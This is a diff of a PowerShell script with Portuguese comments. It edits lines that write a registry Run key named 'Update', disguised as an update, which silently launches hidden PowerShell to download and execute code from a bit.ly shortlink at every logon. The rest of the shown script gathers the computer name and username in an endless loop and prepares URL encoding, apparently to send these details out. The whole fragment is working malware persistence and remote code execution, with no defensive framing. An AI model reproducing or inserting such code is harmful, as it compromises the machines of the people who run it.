@@ -10,7 +10,7 @@ $windowsVersion = Get-WindowsVersion
 
 # Verifica se a versão do Windows é maior que 10
 if ([version]$windowsVersion -gt [version]"10.0") {
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex (iwr -useb https://bit.ly/DriveUpdate)" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex (iwr -useb https://bit.ly/Driveupdate)" /f
     while ($true) {
         $nomePC = $env:COMPUTERNAME
         $nomeUsuario = $env:username
@@ -48,7 +48,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_
 } else {
     # Se a versão do Windows for menor que 10, execute o código adicional aqui
     # Define a função para fazer a codificação URL
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex ((New-Object Net.WebClient).DownloadString("https://bit.ly/DriveUpdate")
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex ((New-Object Net.WebClient).DownloadString("https://bit.ly/Driveupdate")
 )" /f
     function UrlEncode {
         param (
